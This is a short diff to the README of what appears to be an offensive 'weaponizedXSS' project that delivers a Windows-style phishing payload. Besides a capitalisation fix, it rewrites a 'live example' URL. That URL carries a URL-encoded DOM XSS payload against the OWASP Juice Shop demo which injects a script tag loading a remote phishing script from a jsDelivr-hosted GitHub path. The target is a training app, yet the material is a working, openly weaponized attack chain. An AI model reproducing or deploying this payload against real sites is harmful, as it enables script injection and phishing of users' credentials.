@@ -36,9 +36,9 @@ The payload (`winph.js`) supports the following options:
 
 ## Live Example
 
-* *(live example - OWASP juice shop - DOM XSS)*
+* *(live example - OWASP Juice Shop - DOM XSS)*
 
-    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%2FWindowsPhishing%2FwinphLiveExample.js%27%3B%22%3E
+    https://preview.owasp-juice.shop/#/search?q=%3Cimg%20src%20onerror%3D%22with(document)body.appendChild(createElement(%27script%27)).src%3D%27%2F%2Fcdn.jsdelivr.net%2Fgh%2Flighthouseitsecurity%2FweaponizedXSS%40main%2FWindowsPhishing%2FwinphLiveExample.js%27%3B%22%3E
 
 ## Test Environment
 
